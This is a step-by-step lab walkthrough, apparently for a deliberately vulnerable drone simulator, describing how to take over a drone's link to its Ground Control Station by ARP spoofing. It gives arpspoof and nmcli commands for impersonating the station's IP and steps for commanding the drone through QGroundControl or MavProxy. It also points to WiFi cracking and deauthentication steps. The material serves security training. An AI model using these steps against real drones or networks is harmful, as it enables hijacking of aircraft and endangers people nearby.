  - title: Description
    content: |
      ARP spoofing involves sending false ARP (Address Resolution Protocol) messages to a network, associating the attacker's 
      MAC address with the IP address of the target device (the GCS in this case). This allows the attacker to intercept, modify, 
      or block communication to the target device, effectively taking control of the drone's communication.<br><br>

      The goal of this attack is to intercept and control the communication between the drone and the Ground Control 
      Station (GCS) by performing an ARP spoofing attack. This enables the attacker to impersonate the GCS, sending 
      and receiving commands from the drone.

    collapsible: true
    steps:
      - title: Step 1. Initialize the Drone
        description: |
          Ensure the drone is powered on and connected to the network.

      - title: Step 2. Break into the Drone Network
        description: |
          Use WiFi packet capture and cracking techniques to gain access to the drone's network.
          See: <a href="/attacks/recon/wifi-analysis-cracking">Wifi Cracking</a> as well as <a href="/attacks/recon/packet-sniffing">Packet Sniffing</a>

      - title: Step 3. Perform WiFi Deauth Attack on GCS
        description: |
          Execute a deauthentication attack to disconnect the GCS from the network.
          See: <a href="/attacks/dos/wireless-deauthentication">Wifi Deauth Attack</a>

      - title: Step 4. Install QGroundControl (if on x86_64 System)
        description: |
          Install QGroundControl on your attacker machine (if supported) - Note: This will be different from the QGroundControl you launch from the DVD Simulator (As this has a fixed IP of 10.13.0.6 from the docker network)
          ```wget https://s3-us-west-2.amazonaws.com/qgroundcontrol/latest/QGroundControl.AppImage
          chmod +x QGroundControl.AppImage
          ./QGroundControl.AppImage
          ```

      - title: Step 5. Install MavProxy (if on ARM systems like Apple Silicon)
        description: |
          Install MavProxy on your attacker machine.
          ```sudo pip install MAVProxy
          mavproxy.py
          ```

      - title: Step 6. Note Kali IP Address on the Drone Network
        description: |
          Find and note the IP address of your attacker machine on the drone network.
          ```ifconfig wlan0
          ```

      - title: Step 7. ARP Spoofing
        description: |
          Trick the router into thinking the attacker's MAC address is the GCS IP.
          ```sudo arpspoof -i wlan0 -t 192.168.13.14 -r 192.168.13.1
          ```

      - title: Step 8. Set Static GCS IP Address
        description: |
          Configure your attacker machine to use the GCS IP address.
          ```nmcli connection modify "Drone_Wifi" ipv4.method manual ipv4.addresses 192.168.13.14/24 ipv4.gateway 192.168.13.1 ipv4.dns "8.8.8.8 8.8.4.4"
          ```

      - title: Step 9. Restart Network Connection
        description: |
          Restart the network connection to apply changes.
          ```nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
          ```

      - title: Step 10. Initialize Drone or Wait for Connection
        description: |
          Initialize the drone or wait for QGroundControl or MavProxy to connect to the drone.

      - title: Step 11. Control Drone via QGroundControl (x86_64 systems)
        description: |
          Use QGroundControl to send commands to the drone.
          - Right-click on the map and select "Go to"
          - Click status and select "RTL" (Return to Launch)
          - Click status and select "Land"

      - title: Step 12. Control Drone via MavProxy (ARM systems)
        description: |
          Use MavProxy to send commands to the drone.
          - Type commands such as "go to"
          - Type "rtl" to return to launch
          - Type "land" to land the drone

      - title: Step 13. Reset Kali Network Configuration
        description: |
          Restore the original network settings on your attacker machine.
          ```nmcli connection modify "Drone_Wifi" ipv4.method manual ipv4.addresses 192.168.13.10/24 ipv4.gateway 192.168.13.1 ipv4.dns "8.8.8.8 8.8.4.4"
          nmcli connection down "Drone_Wifi" && nmcli connection up "Drone_Wifi"
          ```
